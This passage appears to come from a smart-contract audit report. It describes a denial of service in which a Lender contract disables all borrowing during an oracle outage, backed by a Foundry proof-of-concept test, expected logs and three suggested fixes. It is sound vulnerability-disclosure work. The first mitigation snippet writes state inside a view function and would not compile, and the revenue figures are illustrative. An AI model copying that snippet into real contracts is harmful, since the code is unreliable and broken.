- Competitive disadvantage: users switch to protocols with better oracle handling
- Long duration: oracle outages can last hours to days
- No workaround: users cannot bypass even if willing to accept risk
- Protocol growth halted: cannot onboard new users

### Financial Impact

Example:

```text
Daily revenue = $10k
```

Week outage:

```text
$70k lost revenue
```

Additional consequence:

```text
Permanent user churn
```

## PoC

- Create a File Exploit.t.sol at test folder and paste the following code -
```solidity
// SPDX-License-Identifier: UNLICENSED  
pragma solidity 0.8.24;  
  
import {Test, console} from "forge-std/Test.sol";  
import {  
    Lender,  
    ERC20,  
    Coin,  
    Vault,  
    InterestModel,  
    IChainlinkFeed,  
    IFactory,  
    ERC4626  
} from "src/Lender.sol";  
  
/*//////////////////////////////////////////////////////////////  
                            MOCKS  
//////////////////////////////////////////////////////////////*/  
  
contract ERC20Mock is ERC20 {  
    constructor() ERC20("WETH", "WETH", 18) {}  
    function mint(address to, uint256 amt) external { _mint(to, amt); }  
}  
  
contract CoinMock is ERC20 {  
    constructor() ERC20("Monolith USD", "mUSD", 18) {}  
    function mint(address to, uint256 amt) external { _mint(to, amt); }  
    function burn(uint256 amt) external { _burn(msg.sender, amt); }  
}  
  
/// @notice Oracle that returns a stale/invalid price (0)  
contract FeedMockFailing {  
    bool public fail;  
  
    function setFail(bool _fail) external {  
        fail = _fail;  
    }  
  
    function latestRoundData()  
        external  
        view  
        returns (uint80, int256, uint256, uint256, uint80)  
    {  
        if (fail) {  
            // Simulate oracle returning invalid price  
            return (0, 0, 0, block.timestamp, 0);  
        }  
        return (0, 2000e18, 0, block.timestamp, 0);  
    }  
  
    function decimals() external pure returns (uint8) {  
        return 18;  
    }  
}  
  
contract VaultMock {  
    function totalAssets() external pure returns (uint256) {  
        return 1e18;  
    }  
}  
  
contract InterestModelMock {  
    function calculateInterest(  
        uint, uint, uint, uint, uint, uint, uint  
    ) external pure returns (uint, uint) {  
        return (1e18, 0);  
    }  
}  
  
contract FactoryMock {  
    function getFeeOf(address) external pure returns (uint) { return 0; }  
    function minDebtFloor() external pure returns (uint) { return 1e15; }  
}  
  
/*//////////////////////////////////////////////////////////////  
                            POC  
//////////////////////////////////////////////////////////////*/  
  
contract POC_BorrowingDOS is Test {  
    Lender lender;  
    ERC20Mock collateral;  
    CoinMock coin;  
    FeedMockFailing feed;  
  
    address user = makeAddr("user");  
  
    function setUp() public {  
        collateral = new ERC20Mock();  
        coin = new CoinMock();  
        feed = new FeedMockFailing();  
  
        lender = new Lender(  
            Lender.LenderParams({  
                collateral: ERC20(address(collateral)),  
                psmAsset: ERC20(address(0)),  
                psmVault: ERC4626(address(0)),  
                feed: IChainlinkFeed(address(feed)),  
                coin: Coin(address(coin)),  
                vault: Vault(address(new VaultMock())),  
                interestModel: InterestModel(address(new InterestModelMock())),  
                factory: IFactory(address(new FactoryMock())),  
                operator: address(this),  
                manager: address(this),  
                collateralFactor: 8500, // 85%  
                minDebt: 1e15,  
                timeUntilImmutability: 365 days,  
                halfLife: 7 days,  
                targetFreeDebtRatioStartBps: 2000,  
                targetFreeDebtRatioEndBps: 4000,  
                redeemFeeBps: 30,  
                stalenessThreshold: 1 hours,  
                maxBorrowDeltaBps: 50,  
                minTotalSupply: 1  
            })  
        );  
  
        console.log("\n=== SETUP COMPLETE ===");  
    }  
  
    function test_Borrowing_DOS() public {  
        /*//////////////////////////////////////////////////////////////  
                        USER DEPOSITS COLLATERAL  
        //////////////////////////////////////////////////////////////*/  
  
        uint256 collateralAmount = 10 ether;  
        collateral.mint(user, collateralAmount);  
  
        vm.startPrank(user);  
        collateral.approve(address(lender), collateralAmount);  
        lender.adjust(user, int256(collateralAmount), 0);  
        vm.stopPrank();  
  
        console.log("\nUser deposited collateral:");  
        console.log("  Collateral:", collateralAmount / 1e18, "ETH");  
  
        /*//////////////////////////////////////////////////////////////  
                        NORMAL OPERATION  
        //////////////////////////////////////////////////////////////*/  
  
        (uint priceBefore,,) = lender.getCollateralPrice();  
        console.log("\nNormal oracle state:");  
        console.log("  Price:", priceBefore / 1e18, "USD");  
        console.log("  Borrowing enabled");  
  
        /*//////////////////////////////////////////////////////////////  
                        ORACLE FAILURE  
        //////////////////////////////////////////////////////////////*/  
  
        feed.setFail(true);  
  
        (uint priceAfter, bool reduceOnly,) = lender.getCollateralPrice();  
  
        console.log("\nOracle failure simulated:");  
        console.log("  Raw price returned:", priceAfter);  
        console.log("  reduceOnly flag:", reduceOnly);  
        console.log("  price == 1 fallback applied");  
  
        uint borrowingPower =  
            priceAfter * collateralAmount * 8500 / 1e18 / 10000;  
  
        console.log("\nBorrowing power calculation:");  
        console.log("  borrowingPower =", borrowingPower);  
        console.log("  ~ 0 (effectively zero)");  
  
        /*//////////////////////////////////////////////////////////////  
                        BORROW ATTEMPT  
        //////////////////////////////////////////////////////////////*/  
  
        console.log("\nUser attempts to borrow 5,000 stablecoins");  
  
        vm.prank(user);  
        vm.expectRevert("Reduce only");  
        lender.adjust(user, 0, 5_000e18);  
  
        console.log("\n=== RESULT ===");  
        console.log("Borrow reverted with `Reduce only`");  
        console.log("All borrowing is effectively DOSed while oracle is invalid");  
    }  
}  
``` 
- Now run command
```solidity
forge test --mt test_Borrowing_DOS -vv  
```
- Expected Output
```solidity
[PASS] test_Borrowing_DOS() (gas: 306651)  
Logs:  
  
=== SETUP COMPLETE ===  
  
User deposited collateral:  
    Collateral: 10 ETH  
  
Normal oracle state:  
    Price: 2000 USD  
    Borrowing enabled  
  
Oracle failure simulated:  
    Raw price returned: 1  
    reduceOnly flag: true  
    price == 1 fallback applied  
  
Borrowing power calculation:  
    borrowingPower = 8  
    ~ 0 (effectively zero)  
  
User attempts to borrow 5,000 stablecoins  
  
=== RESULT ===  
  Borrow reverted with `Reduce only`  
  All borrowing is effectively DOSed while oracle is invalid  
```

## Mitigation

### Option 1: Use last known good price with warning (Recommended)

```solidity
uint256 public lastValidPrice;
uint256 public lastValidPriceTime;

function getCollateralPrice()
    public
    view
    returns (
        uint price,
        bool reduceOnly,
        bool allowLiquidations
    )
{
    // Try to get fresh price
    try this.getFeedPrice() returns (
        uint _price,
        uint _updatedAt
    ) {
        if (_price > 0) {
            lastValidPrice = _price;
            lastValidPriceTime = _updatedAt;
            price = _price;
        }
    } catch {
        // Use last valid price if recent
        if (block.timestamp - lastValidPriceTime < 7 days) {
            price = lastValidPrice;
            reduceOnly = true; // warn but allow borrowing
            allowLiquidations = false;
        } else {
            revert("Oracle failed and no recent price available");
        }
    }

    // Handle staleness...
}
```

### Option 2: Allow borrowing with conservative parameters

```solidity
function adjust(
    address account,
    int collateralDelta,
    int debtDelta
) public {
    // ... existing logic ...

    (uint price, bool reduceOnly, ) = getCollateralPrice();

    if (!reduceOnly) {
        // Normal borrowing power
        uint borrowingPower =
            price *
            _cachedCollateralBalances[account] *
            collateralFactor /
            1e18 /
            10000;

        require(
            debtBalance <= borrowingPower,
            "Solvency check failed"
        );

    } else if (debtDelta > 0) {
        // Reduced-mode borrowing
        uint conservativeCF =
            collateralFactor * 50 / 100;

        uint borrowingPower =
            price *
            _cachedCollateralBalances[account] *
            conservativeCF /
            1e18 /
            10000;

        require(
            debtBalance <= borrowingPower,
            "Conservative solvency check failed during oracle issues"
        );
    }
}
```

### Option 3: Clear error messages

```solidity
function adjust(
    address account,
    int collateralDelta,
    int debtDelta
) public {
    // ... existing logic ...

    (uint price, bool reduceOnly, ) = getCollateralPrice();

    if (debtDelta > 0) {
        require(
            !reduceOnly,
            "Borrowing disabled: Oracle price unavailable or stale"
        );

        require(
            price >= 1e6,
            "Borrowing disabled: Oracle price invalid"
        );
    }

    // ... rest of checks ...
}
```

